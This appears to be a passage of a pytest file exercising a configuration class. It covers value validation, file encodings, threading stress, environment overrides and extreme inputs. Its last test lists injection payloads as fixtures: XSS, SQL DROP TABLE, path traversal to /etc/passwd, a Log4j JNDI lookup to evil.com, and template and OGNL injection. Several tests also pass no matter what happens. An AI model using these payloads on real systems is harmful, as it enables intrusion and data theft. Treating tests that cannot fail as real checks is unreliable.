                    except (ValueError, ConfigError):
                        # Some valid ports might still be rejected by specific implementations
                        pass
                else:
                    with pytest.raises((ValueError, ConfigError)):
                        Config(config_data)


# Additional parametrized tests for comprehensive coverage
@pytest.mark.parametrize("field,value,expected_valid", [
    ("timeout", 1, True),
    ("timeout", 30, True),
    ("timeout", 300, True),
    ("timeout", 0, False),
    ("timeout", -1, False),
    ("max_retries", 0, True),
    ("max_retries", 1, True),
    ("max_retries", 10, True),
    ("max_retries", -1, False),
    ("debug", True, True),
    ("debug", False, True),
    ("debug", 1, False),
    ("debug", "true", False),
])
def test_config_field_validation_comprehensive(field, value, expected_valid):
    """Comprehensive field validation test."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': 'test_key',
        'base_url': 'https://api.example.com',
        field: value
    }
    
    if expected_valid:
        try:
            config = Config(config_data)
            assert config is not None
        except (ValueError, ConfigError):
            pytest.fail(f"Valid {field}={value} was rejected")
    else:
        with pytest.raises((ValueError, ConfigError, TypeError)):
            Config(config_data)


@pytest.mark.parametrize("api_key_length", [1, 10, 32, 64, 128, 256, 512, 1024])
def test_config_api_key_lengths(api_key_length):
    """Test configuration with various API key lengths."""
    if not Config:
        pytest.skip("Config class not available")
    
    api_key = 'x' * api_key_length
    config_data = {
        'api_key': api_key,
        'base_url': 'https://api.example.com'
    }
    
    try:
        config = Config(config_data)
        assert config is not None
        if hasattr(config, 'api_key'):
            assert len(config.api_key) == api_key_length
    except (ValueError, ConfigError):
        # Some key lengths may be rejected
        pass


@pytest.mark.parametrize("encoding", ["utf-8", "ascii", "latin-1"])
def test_config_file_encodings(encoding):
    """Test configuration file loading with different encodings."""
    if not load_config:
        pytest.skip("load_config function not available")
    
    config_data = {'api_key': 'test_key_éñ'}  # Include non-ASCII characters
    
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False, encoding=encoding) as f:
            json.dump(config_data, f, ensure_ascii=False)
            temp_path = f.name
        
        try:
            config = load_config(temp_path)
            assert config is not None
        except (UnicodeDecodeError, ValueError, ConfigError):
            # Some encodings may not be supported
            pass
        finally:
            os.unlink(temp_path)
    except UnicodeEncodeError:
        # Skip if encoding can't handle the test data
        pytest.skip(f"Encoding {encoding} cannot handle test data")


class TestConfigRobustness:
    """Robustness tests for configuration handling."""
    
    def test_config_with_system_limits(self):
        """Test configuration behavior at system limits."""
        if Config:
            import sys
            
            # Test with maximum integer values
            limit_config = {
                'api_key': 'test_key',
                'base_url': 'https://api.example.com',
                'max_connections': sys.maxsize,
                'buffer_size': 2**20,  # 1MB
                'timeout': 86400  # 24 hours
            }
            
            try:
                config = Config(limit_config)
                assert config is not None
            except (ValueError, ConfigError, OverflowError):
                # System limits may be enforced
                pass
    
    def test_config_recovery_from_partial_failure(self):
        """Test config recovery from partial configuration failures."""
        if Config:
            # Test with some valid and some invalid fields
            mixed_config = {
                'api_key': 'valid_key',
                'base_url': 'https://api.example.com',
                'timeout': 30,  # Valid
                'invalid_field': None,  # Invalid
                'max_retries': -1  # Invalid
            }
            
            try:
                config = Config(mixed_config)
                # Some implementations might ignore invalid fields
                assert config is not None
            except (ValueError, ConfigError):
                # Others might fail on any invalid field
                pass
    
    def test_config_stress_testing(self):
        """Stress test configuration with rapid operations."""
        if Config and load_config:
            import threading
            import time
            
            # Create multiple config files
            temp_files = []
            for i in range(10):
                with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                    json.dump({'api_key': f'stress_test_{i}'}, f)
                    temp_files.append(f.name)
            
            results = []
            errors = []
            
            def stress_operations():
                try:
                    for i in range(50):
                        # Alternate between creating configs and loading from files
                        if i % 2 == 0:
                            config = Config({'api_key': f'stress_{i}'})
                        else:
                            file_index = i % len(temp_files)
                            config = load_config(temp_files[file_index])
                        results.append(config)
                        time.sleep(0.001)  # Small delay
                except Exception as e:
                    errors.append(e)
            
            # Run stress test with multiple threads
            threads = [threading.Thread(target=stress_operations) for _ in range(5)]
            
            start_time = time.time()
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()
            end_time = time.time()
            
            # Clean up
            for temp_file in temp_files:
                os.unlink(temp_file)
            
            # Stress test should complete without excessive errors
            total_operations = len(results) + len(errors)
            if total_operations > 0:
                error_rate = len(errors) / total_operations
                assert error_rate < 0.1, f"High error rate: {error_rate:.2%}"
            
            # Should complete in reasonable time
            assert end_time - start_time < 30, "Stress test took too long"


class TestConfigEnvironmentIntegration:
    """Test configuration integration with environment variables."""
    
    def test_config_environment_variable_override(self):
        """Test that environment variables can override config values."""
        if Config:
            with patch.dict(os.environ, {
                'CONFIG_API_KEY': 'env_override_key',
                'CONFIG_DEBUG': 'true',
                'CONFIG_TIMEOUT': '60'
            }):
                base_config = {
                    'api_key': 'file_key',
                    'debug': False,
                    'timeout': 30
                }
                
                config = Config(base_config)
                assert config is not None
                # Environment variables may or may not override file values
    
    def test_config_environment_variable_validation(self):
        """Test validation of environment variable values."""
        if Config:
            with patch.dict(os.environ, {
                'CONFIG_TIMEOUT': 'invalid_number',
                'CONFIG_DEBUG': 'maybe'
            }):
                try:
                    config = Config({'api_key': 'test'})
                    assert config is not None
                except (ValueError, ConfigError):
                    # Invalid environment values should be caught
                    pass
    
    def test_config_missing_environment_variables(self):
        """Test behavior when required environment variables are missing."""
        if Config:
            # Clear relevant environment variables
            env_vars_to_clear = ['CONFIG_API_KEY', 'API_KEY', 'DREAMWEAVER_API_KEY']
            original_values = {}
            
            for var in env_vars_to_clear:
                if var in os.environ:
                    original_values[var] = os.environ[var]
                    del os.environ[var]
            
            try:
                config = Config({})
                # Should either provide defaults or raise an error
                assert config is not None or True  # Allow either behavior
            except (ValueError, ConfigError, KeyError):
                # Missing required values should raise errors
                pass
            finally:
                # Restore original environment
                for var, value in original_values.items():
                    os.environ[var] = value


class TestConfigValidationSchema:
    """Test advanced configuration validation schemas."""
    
    def test_config_nested_validation(self):
        """Test validation of nested configuration structures."""
        if validate_config or Config:
            nested_config = {
                'api_key': 'test_key',
                'database': {
                    'host': 'localhost',
                    'port': 5432,
                    'credentials': {
                        'username': 'user',
                        'password': 'pass'
                    }
                },
                'cache': {
                    'redis': {
                        'host': 'localhost',
                        'port': 6379
                    }
                }
            }
            
            if validate_config:
                try:
                    validate_config(nested_config)
                except (ValueError, ConfigError):
                    # Complex nested structures may not be supported
                    pass
            elif Config:
                try:
                    config = Config(nested_config)
                    assert config is not None
                except (ValueError, ConfigError):
                    pass
    
    def test_config_conditional_validation(self):
        """Test conditional validation rules."""
        if validate_config or Config:
            # Test configurations where some fields depend on others
            conditional_configs = [
                {
                    'api_key': 'test_key',
                    'auth_type': 'oauth',
                    'client_id': 'oauth_client',
                    'client_secret': 'oauth_secret'
                },
                {
                    'api_key': 'test_key',
                    'auth_type': 'basic',
                    'username': 'user',
                    'password': 'pass'
                }
            ]
            
            for config_data in conditional_configs:
                if validate_config:
                    try:
                        validate_config(config_data)
                    except (ValueError, ConfigError):
                        # Conditional validation may not be implemented
                        pass
                elif Config:
                    try:
                        config = Config(config_data)
                        assert config is not None
                    except (ValueError, ConfigError):
                        pass
    
    def test_config_range_validation(self):
        """Test validation of value ranges."""
        if validate_config or Config:
            range_test_cases = [
                ('timeout', 1, 3600, True),      # Valid range
                ('timeout', 0, 3600, False),     # Below minimum
                ('timeout', 3601, 3600, False),  # Above maximum
                ('port', 1, 65535, True),        # Valid port range
                ('port', 0, 65535, False),       # Invalid port
                ('retry_count', 0, 10, True),    # Valid retry range
                ('retry_count', -1, 10, False)   # Invalid negative retry
            ]
            
            for field, value, max_val, should_be_valid in range_test_cases:
                config_data = {
                    'api_key': 'test_key',
                    field: value
                }
                
                if should_be_valid:
                    if validate_config:
                        try:
                            validate_config(config_data)
                        except (ValueError, ConfigError):
                            # Range validation may not be implemented
                            pass
                    elif Config:
                        try:
                            config = Config(config_data)
                            assert config is not None
                        except (ValueError, ConfigError):
                            pass
                else:
                    if validate_config:
                        try:
                            validate_config(config_data)
                            # Should have failed validation
                        except (ValueError, ConfigError):
                            # Expected failure
                            pass
                    elif Config:
                        try:
                            Config(config_data)
                            # Should have failed creation
                        except (ValueError, ConfigError):
                            # Expected failure
                            pass


class TestConfigPerformanceOptimization:
    """Test configuration performance optimization scenarios."""
    
    def test_config_lazy_loading(self):
        """Test lazy loading of configuration values."""
        if Config:
            large_config = {
                'api_key': 'test_key',
                'large_data': 'x' * 100000,  # Large string value
                'computed_value': lambda: sum(range(1000))  # Expensive computation
            }
            
            try:
                # Config creation should be fast even with large/expensive values
                import time
                start_time = time.time()
                config = Config(large_config)
                creation_time = time.time() - start_time
                
                assert config is not None
                assert creation_time < 0.1  # Should be fast
            except (ValueError, ConfigError, TypeError):
                # Lambda functions may not be supported
                pass
    
    def test_config_caching_behavior(self):
        """Test configuration value caching."""
        if Config:
            config_data = {'api_key': 'test_key', 'timeout': 30}
            config = Config(config_data)
            
            # Access the same value multiple times
            import time
            start_time = time.time()
            
            for _ in range(1000):
                if hasattr(config, 'api_key'):
                    value = config.api_key
                elif 'api_key' in config:
                    value = config['api_key']
            
            access_time = time.time() - start_time
            
            # Repeated access should be very fast (cached)
            assert access_time < 0.01
    
    def test_config_memory_efficiency(self):
        """Test memory efficiency of config objects."""
        if Config:
            import sys
            
            # Create a config and measure its memory footprint
            config_data = {'api_key': 'test_key'}
            config = Config(config_data)
            
            # Get approximate size
            try:
                config_size = sys.getsizeof(config)
                # Config object shouldn't be excessively large
                assert config_size < 10000  # 10KB limit
            except (TypeError, AttributeError):
                # getsizeof may not work with all config implementations
                pass


# Edge case tests with extreme values
@pytest.mark.parametrize("extreme_value", [
    "",  # Empty string
    " ",  # Whitespace only
    "\n\t\r",  # Various whitespace characters
    "a" * 100000,  # Very long string
    "🚀🌟✨",  # Unicode emojis
    "test\x00null",  # String with null byte
    "test\nline\nbreaks",  # Multi-line string
    "test\ttab\tcharacters",  # Tab characters
])
def test_config_extreme_string_values(extreme_value):
    """Test configuration with extreme string values."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': extreme_value,
        'base_url': 'https://api.example.com'
    }
    
    try:
        config = Config(config_data)
        assert config is not None
    except (ValueError, ConfigError, UnicodeError):
        # Some extreme values may be rejected
        pass


@pytest.mark.parametrize("malicious_input", [
    "<script>alert('xss')</script>",  # XSS attempt
    "'; DROP TABLE configs; --",  # SQL injection attempt
    "../../../etc/passwd",  # Path traversal attempt
    "${jndi:ldap://evil.com/a}",  # Log4j style injection
    "{{7*7}}",  # Template injection attempt
    "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)",  # OGNL injection
])
def test_config_security_against_injection(malicious_input):
    """Test configuration security against various injection attempts."""
    if not Config:
        pytest.skip("Config class not available")
    
    config_data = {
        'api_key': malicious_input,
        'base_url': 'https://api.example.com'
    }
    
    try:
        config = Config(config_data)
        assert config is not None
        
        # Ensure malicious input is treated as literal string
        if hasattr(config, 'api_key'):
            stored_value = config.api_key
            assert stored_value == malicious_input  # Should be stored as-is
    except (ValueError, ConfigError):
        # Security-conscious implementations may reject suspicious input
        pass
